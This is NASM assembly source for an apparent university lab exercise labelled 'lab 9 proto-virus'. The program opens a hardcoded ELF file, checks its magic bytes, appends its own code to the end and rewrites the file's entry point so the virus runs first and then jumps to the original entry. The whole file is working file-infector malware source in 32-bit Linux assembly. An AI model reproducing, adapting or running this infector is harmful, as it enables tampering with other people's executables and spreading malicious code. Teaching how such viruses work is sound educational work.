%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define SEEK_CUR 1
%define STDIN 0
%define STDOUT 1
%define STDERROR 2
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define PERMISSION 0640
%define VirtAddr 0x08048000
%define oldEntry [ebp-100]
	global _start

section .text

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
; You code for this lab goes here
	;print to stdout "The lab 9 proto-virus strikes!"
	call get_my_loc
	sub eax, anchor - OutStr ; if 'anchor' is the real runtime addr => eax = 'anchor' - (anchor-Outstr)
	write STDOUT, eax,lenOutStr ;ecx = Outstr
	;open ELFexec file
	call get_my_loc
	sub eax, anchor - FileName ; char* FIlname = "a"
	open eax, RDWR, PERMISSION ; ecx= FileName string
	;fd= eax 
	cmp eax, -1
	je exit_fail ;if fd == -1 then exit
	
	push eax ; save fd

	mov ebx,ebp
	sub ebx, STK_RES ; ebx = buf[0]

	; ;check that this is ELF file with 3 first bytes
	read eax,ebx, 52 ; read to stack elf header struct ebx =buf[0]
	mov ebx,ebp
	sub ebx, STK_RES ; ebx = buf[0]
	;check ELF chars [7F 45 4C 46]

	cmp byte[ebx], 0x7F
	jne no_elf
	cmp byte[ebx+1], 0x45
	jne no_elf
	cmp byte[ebx+2], 0x4C
	jne no_elf
	cmp byte[ebx+3], 0x46
	jne no_elf


	mov eax, [esp]
	; ;add code of virus to end of ELF file
	lseek eax, 0, SEEK_END ;seek to the end of the file from offset 0
	push eax ; push file-size

	;compute the virus length
	call get_my_loc
	sub eax, anchor - _start
	mov ecx, virus_end
	sub ecx, eax 
	write [esp+4],eax,ecx ;[esp+4] has the fd , ebx is the pointer to the label, ecx is the size of the virus
	
	;change entry point
	pop eax ;eax = file-size	
	add eax, VirtAddr ;virus-address = file-size + VirtAddr
	push eax ; virus-address
	lseek [esp+4],0,SEEK_SET ;fd points to the begining of the file
	pop eax ;eax = virus-address = file-size + VirtAddr
	lea ebx, [esp+4+ENTRY] ; calculate the address in memory of esp+4+ENTRY and put in ebx
	mov edx, [ebx]
	mov dword oldEntry, edx  ;save the old entry point
	mov [ebx], eax
	lea ebx, [esp+4] ;ebx = buf[0]
	write [esp], ebx, PHDR_size ; write 32 bytes

	; change entry point to the old entry point in file
	lseek [esp],-4,SEEK_END ;pointer to previous Entry Point
	lea ebx, oldEntry 
	write [esp], ebx, 4 ;change the entry point to the old entry point
	close [esp]

	call get_my_loc
	sub eax, anchor - PreviousEntryPoint
	mov eax, [eax]
	jmp eax



	;close file.
	mov eax, [esp]; fd
	close eax
	jmp VirusExit
	no_elf: 
	call get_my_loc
	sub eax, anchor - PreviousEntryPoint
	cmp eax, [PreviousEntryPoint]
	jne inside_the_virus
	call get_my_loc
	sub eax, anchor-NotELF_Err
	write STDOUT,eax ,lenNotELF_Err
	exit -1
	inside_the_virus:
	jmp [eax]
	exit_fail:
       exit -1 	
get_my_loc:
	call anchor
anchor: pop eax
		ret

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
lenOutStr equ $ - OutStr ;length of out string
Failstr:        db "perhaps not", 10 , 0
NotELF_Err:        db "Not ELF format.", 10 , 0
lenNotELF_Err equ $ - NotELF_Err ;length of out string
PreviousEntryPoint: dd VirusExit
virus_end: